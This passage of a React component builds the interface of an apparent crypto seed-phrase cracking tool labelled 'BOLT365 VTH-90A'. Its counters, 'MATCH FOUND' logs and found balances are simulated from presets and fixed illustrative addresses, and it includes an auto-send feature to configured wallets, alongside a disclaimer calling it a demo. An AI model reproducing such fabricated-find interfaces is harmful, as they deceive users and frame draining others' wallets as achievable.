                const response = await fetch(`https://api.blockcypher.com/v1/btc/main/addrs/${illustrativeBtcAddressToCheck}/balance?token=${BLOCKCYPHER_API_KEY}`);
                if (!response.ok) throw new Error(`API request failed with status ${response.status}`);
                const data = await response.json();

                if (data && data.balance !== undefined) {
                    const balanceInSatoshis = BigInt(data.balance);
                    const balanceInBtc = Number(balanceInSatoshis) / 1e8; // 1 BTC = 100,000,000 Satoshis
                    const newAmount = `${balanceInBtc.toFixed(8)} BTC`;
                    setWalletLogs(prevLogs => [`API Result: BlockCypher balance of ${illustrativeBtcAddressToCheck} (from phrase ${seedPhrase}) is ${newAmount}.`, ...prevLogs].slice(0, MAX_LOGS));
                     if (balanceInBtc > 0) {
                        return newAmount;
                    }
                    return presetAmount;
                } else {
                    setWalletLogs(prevLogs => [`API Warning: BlockCypher could not fetch balance for ${illustrativeBtcAddressToCheck} (from phrase ${seedPhrase}). Message: ${data.error || 'Error response'}. Using preset amount.`, ...prevLogs].slice(0, MAX_LOGS));
                }
            } catch (error: any) {
                console.error("BlockCypher API call failed:", error);
                setWalletLogs(prevLogs => [`API Error: BlockCypher call for ${illustrativeBtcAddressToCheck} (from phrase ${seedPhrase}) failed: ${error.message}. Using preset amount.`, ...prevLogs].slice(0, MAX_LOGS));
            }
        } else {
             setWalletLogs(prevLogs => [`API Info: Skipping BlockCypher check for ${cryptoName} as no valid illustrative address or API key is configured.`, ...prevLogs].slice(0, MAX_LOGS));
        }
    }
    return presetAmount;
  }, []);


  const conceptualFind = useCallback(async () => {
     if (simulationStatus !== 'running') return;

     if (!lastFoundTime || (Date.now() - lastFoundTime > 15000)) {
        const presetIndex = getRandomIntSecure(cryptoPresets.length);
        const newlyFoundPreset = cryptoPresets[presetIndex];
        let newlyFound: CryptoFound[] = JSON.parse(JSON.stringify(newlyFoundPreset));

        setLastFoundTime(Date.now());

        const currentPhraseForFind = currentPhraseRef.current || extractPhrase(generateNewLogPhrase());
        setLastFoundSeedPhrase(currentPhraseForFind);

        newlyFound = await Promise.all(newlyFound.map(async (cryptoItem) => {
            const updatedAmount = await performApiBalanceCheck(currentPhraseForFind, cryptoItem.name, cryptoItem.amount);
            return { ...cryptoItem, amount: updatedAmount || cryptoItem.amount, seedPhrase: currentPhraseForFind };
        }));
        

        if (newlyFound.length > 0) {
            setFoundCrypto(prevFound => [...newlyFound, ...prevFound].slice(0, 5));

            newlyFound.forEach(crypto => {
              if (AUTO_SEND_ASSETS.includes(crypto.name)) {
                const targetWallet = sendWallets[crypto.name];
                if (targetWallet && !targetWallet.startsWith('YOUR_')) {
                  setTimeout(() => handleSendCrypto(crypto), 1500);
                } else {
                   console.warn(`Auto-send (UI Demo) cancelled for ${crypto.name}: Invalid target address.`);
                    toast({
                        title: "Auto-Send Cancelled (UI Demo)",
                        description: `Cannot auto-send ${crypto.name}, invalid target address configured. No real transaction attempted.`,
                        variant: "destructive",
                        duration: 5000,
                    });
                }
              }
            });

            setWalletLogs(prevLogs => {
               const matchLogMessage = `!!! MATCH FOUND: Mnemonic "${currentPhraseForFind}" linked to assets. (API calls performed for verification where configured) !!!`;
               const newLogs = [matchLogMessage, ...prevLogs];
               return newLogs.slice(0, MAX_LOGS);
            });
        } else {
             setWalletLogs(prevLogs => {
               const noMatchLog = `Seed phrase "${currentPhraseForFind}" checked via API (where configured), no funded assets found.`;
               const newLogs = [noMatchLog, ...prevLogs];
               return newLogs.slice(0, MAX_LOGS);
            });
        }
     }
  }, [lastFoundTime, handleSendCrypto, toast, performApiBalanceCheck, simulationStatus]);

   const startIntervals = useCallback(() => {
    if (counterIntervalRef.current) clearInterval(counterIntervalRef.current);
    counterIntervalRef.current = setInterval(() => {
      setCheckedCount(prevCount => prevCount + Math.floor(getRandomIntSecure(50) + 10));
      if (Math.random() < FIND_PROBABILITY) {
        conceptualFind();
      }
    }, CHECK_INTERVAL_MS);

    if (logIntervalRef.current) clearInterval(logIntervalRef.current);
    logIntervalRef.current = setInterval(() => {
      setCurrentLogIndex(prevIndex => {
        let nextLogEntry = generateNewLogPhrase();
        currentPhraseRef.current = extractPhrase(nextLogEntry);

        setWalletLogs(prevLogs => {
          const newLogs = [nextLogEntry, ...prevLogs];
          return newLogs.slice(0, MAX_LOGS);
        });
        return (prevIndex + 1) % 1000;
      });
    }, LOG_INTERVAL_MS);
  }, [conceptualFind]);

  const clearIntervals = () => {
    if (counterIntervalRef.current) clearInterval(counterIntervalRef.current);
    if (logIntervalRef.current) clearInterval(logIntervalRef.current);
    counterIntervalRef.current = null;
    logIntervalRef.current = null;
  };

  useEffect(() => {
    if (simulationStatus === 'running') {
      startIntervals();
    } else {
      clearIntervals();
    }
    return () => {
      clearIntervals();
    };
  }, [simulationStatus, startIntervals]);


  const handleStart = () => {
    if (simulationStatus !== 'running') {
       if (simulationStatus === 'stopped') {
           setCheckedCount(0);
           setFoundCrypto([]);
           setLastFoundSeedPhrase(null);
           const firstPhrase = generateNewLogPhrase();
           currentPhraseRef.current = extractPhrase(firstPhrase);
           setWalletLogs([firstPhrase, ...initialWalletChecks.slice(0, MAX_LOGS -1)]);
           setCurrentLogIndex(0);
       }
       setSimulationStatus('running');
       setWalletLogs(prevLogs => {
           const message = simulationStatus === 'stopped' ? "Process started. Using CSPRNG for phrase generation." : "Process resumed.";
           const newLogs = [message, ...prevLogs];
           return newLogs.slice(0, MAX_LOGS);
        });
    }
  };

  const handleStop = () => {
    if (simulationStatus !== 'stopped') {
        setSimulationStatus('stopped');
        setLastFoundSeedPhrase(null);
        currentPhraseRef.current = "";
        setWalletLogs(prevLogs => ["Process stopped. Phrase checks reset.", ...prevLogs].slice(0, MAX_LOGS));
    }
  };

  const handlePause = () => {
    if (simulationStatus === 'running') {
        setSimulationStatus('paused');
        setWalletLogs(prevLogs => ["Process paused.", ...prevLogs].slice(0, MAX_LOGS));
    }
  };


  return (
    <div className="flex flex-col min-h-screen items-center justify-center p-4 md:p-8 bg-background">
      <Card className="w-full max-w-2xl shadow-lg rounded-lg overflow-hidden border-destructive mb-4">
         <CardContent className="p-3 text-center text-xs text-destructive-foreground bg-destructive">
              <strong>Disclaimer:</strong> This application <strong>demonstrates the conceptual process</strong> of checking random crypto seed phrases using CSPRNGs and (where configured) real API calls for specific, illustrative addresses. Successfully finding a funded wallet through random generation is <strong>statistically impossible</strong>. This tool is for educational and illustrative purposes only and <strong>does not perform real wallet cracking or unauthorized access</strong>. API calls are for pre-defined illustrative addresses, not arbitrary generated ones. No actual funds can be moved or recovered from arbitrary wallets by this application.
         </CardContent>
      </Card>
      <Card className="w-full max-w-2xl shadow-lg rounded-lg overflow-hidden border-primary">
        <CardHeader className="bg-primary text-primary-foreground p-4">
          <CardTitle className="text-center text-xl md:text-2xl font-semibold tracking-wider">
            BOLT365 VTH-90A
          </CardTitle>
        </CardHeader>
        <CardContent className="p-6 space-y-6">
           <div className="flex justify-center space-x-2">
             <Button
                onClick={handleStart}
                disabled={simulationStatus === 'running'}
                variant="secondary"
                className="bg-green-600 hover:bg-green-700 text-white"
             >
                <PlayIcon className="mr-2 h-4 w-4" />
                {simulationStatus === 'paused' ? 'Continue' : 'Start'}
             </Button>
             <Button
                onClick={handlePause}
                disabled={simulationStatus !== 'running'}
                variant="secondary"
                className="bg-yellow-500 hover:bg-yellow-600 text-black"
             >
                <PauseIcon className="mr-2 h-4 w-4" /> Pause
             </Button>
             <Button
                onClick={handleStop}
                disabled={simulationStatus === 'stopped'}
                variant="destructive"
             >
                <SquareIcon className="mr-2 h-4 w-4" /> Stop
             </Button>
          </div>

          <Separator />

          <div className="text-center">
            <p className="text-sm text-muted-foreground uppercase tracking-widest">Phrases Checked (Using CSPRNG)</p>
            <p className="text-3xl md:text-4xl font-bold text-foreground tabular-nums">
              {checkedCount.toLocaleString()}
            </p>
             <p className="text-xs text-muted-foreground mt-1">
              Status: <span className={`font-medium ${
                simulationStatus === 'running' ? 'text-green-600' :
                simulationStatus === 'paused' ? 'text-yellow-600' :
                'text-red-600'
              }`}>{simulationStatus.charAt(0).toUpperCase() + simulationStatus.slice(1)}</span>
            </p>
          </div>

          <Separator />

          <div className="h-40 overflow-hidden relative bg-muted/30 rounded p-2 border border-input">
             <div className="absolute inset-x-0 top-0 h-6 bg-gradient-to-b from-muted/30 via-muted/30 to-transparent pointer-events-none z-10"></div>
            <div className={`space-y-1 text-sm md:text-base text-muted-foreground font-mono ${simulationStatus === 'running' ? 'running animate-pulse-slow' : ''}`}>
              {walletLogs.map((log, index) => (
                <p key={index} className={`transition-opacity duration-300 ${index > 0 ? 'opacity-70' : 'opacity-100'} ${index > 1 ? 'opacity-50' : ''} ${index > 2 ? 'opacity-30' : ''} text-xs whitespace-nowrap overflow-hidden text-ellipsis`}>
                  {log.startsWith('!!!') ? <span className="text-green-500 font-bold">{log}</span> :
                   log.includes('API Result:') || log.includes('API Call:') ? <span className="text-blue-500 font-semibold">{log}</span> :
                   log.includes('API Warning:') || log.includes('API Error:') ? <span className="text-orange-500 font-semibold">{log}</span> :
                   log}
                </p>
              ))}
            </div>
             <div className="absolute inset-x-0 bottom-0 h-6 bg-gradient-to-t from-muted/30 via-muted/30 to-transparent pointer-events-none z-10"></div>
          </div>


          <Separator />

           <div className="min-h-[150px] max-h-[300px] overflow-y-auto">
             {foundCrypto.length > 0 ? (
               <div className="space-y-3 animate-fade-in">
                 <p className="text-lg md:text-xl font-semibold text-accent">
                   Recently "Found" Assets (Illustrative)
                 </p>
                 {foundCrypto.map((crypto, findIndex) => (
                    <div key={findIndex} className="border p-3 rounded-md shadow-sm bg-card">
                        <p className="text-sm text-muted-foreground mb-1">
                         From Mnemonic: <span className="font-mono text-foreground break-all text-xs">{crypto.seedPhrase}</span>
                        </p>
                        <div className="flex justify-between items-center py-1">
                          <p className="font-medium text-foreground">
                           <span className="text-accent font-semibold">{crypto.amount}</span> - {crypto.name}
                           {(crypto.name === "Ethereum" && crypto.amount.includes("ETH")) && <span className="ml-1 text-xs text-blue-500">(Balance via Etherscan API for illustrative address)</span>}
                           {(crypto.name === "Bitcoin" && crypto.amount.includes("BTC")) && <span className="ml-1 text-xs text-blue-500">(Balance via BlockCypher API for illustrative address)</span>}
                           {AUTO_SEND_ASSETS.includes(crypto.name) && (
                              <span className="ml-2 text-xs text-green-600">(Auto-Send UI Demo)</span>
                           )}
                          </p>
                          <Button
                            size="sm"
                            variant="outline"
                            onClick={() => handleSendCrypto(crypto)}
                            className="ml-4"
                            disabled={AUTO_SEND_ASSETS.includes(crypto.name) || !sendWallets[crypto.name] || sendWallets[crypto.name].startsWith('YOUR_') || simulationStatus !== 'running'}
                          >
                            Send (UI Demo)
                          </Button>
                       </div>
                    </div>
                 ))}
               </div>
             ) : (
                <div className="text-center text-muted-foreground italic py-4">
                  {simulationStatus === 'stopped' ? 'Process stopped. Phrase checks reset.' :
                   simulationStatus === 'paused' ? 'Process paused.' :
                   'Scanning networks (conceptual)... No matches detected yet.'}
                </div>
             )}
           </div>


          <Separator />

          <div className="flex justify-center items-center space-x-3 md:space-x-4 pt-4 opacity-80">
            <BitcoinIcon className="h-7 w-7 md:h-9 md:w-9 text-foreground" title="Bitcoin" />
            <EthereumIcon className="h-7 w-7 md:h-9 md:w-9 text-foreground" title="Ethereum" />
            <TetherIcon className="h-7 w-7 md:h-9 md:w-9 text-foreground" title="Tether (TRC20)" />
            <span className="text-xs text-muted-foreground -ml-2 mr-1">(TRC20)</span>
            <TetherIcon className="h-7 w-7 md:h-9 md:w-9 text-foreground" title="Tether (ERC20)" />
             <span className="text-xs text-muted-foreground -ml-2 mr-1">(ERC20)</span>
            <LitecoinIcon className="h-7 w-7 md:h-9 md:w-9 text-foreground" title="Litecoin" />
          </div>
        </CardContent>
      </Card>
       <style jsx>{`
        @keyframes fade-in {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in {
          animation: fade-in 0.5s ease-out forwards;
        }
         @keyframes pulse-slow {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.95; }
        }
         .running .animate-pulse-slow {
           animation: pulse-slow 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
         }
      `}</style>
    </div>
  );
}
